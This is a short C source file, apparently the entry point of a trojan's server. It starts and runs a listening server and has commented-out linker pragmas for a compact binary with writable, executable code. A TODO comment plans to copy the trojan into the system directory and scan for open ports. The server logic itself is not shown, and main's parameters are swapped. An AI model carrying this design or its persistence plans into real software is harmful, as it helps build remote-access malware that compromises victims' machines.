#include "Server.h"

// #pragma comment(linker, "/MERGE:.rdata=.text")
// #pragma comment(linker, "/FILEALIGN:512 /SECTION:.text,EWRX /IGNORE:4078")
// #pragma comment(linker, "/ENTRY:WinMain")

int main(char** argv, int argc)
{
	// TODO: copy trojan to sysdir. find open ports?
	SERVER server;
	if(!InitServer(&server))
		return -1;

	RunServer(&server);
	
	closesocket(server.listen_sock);

	return 0;
}

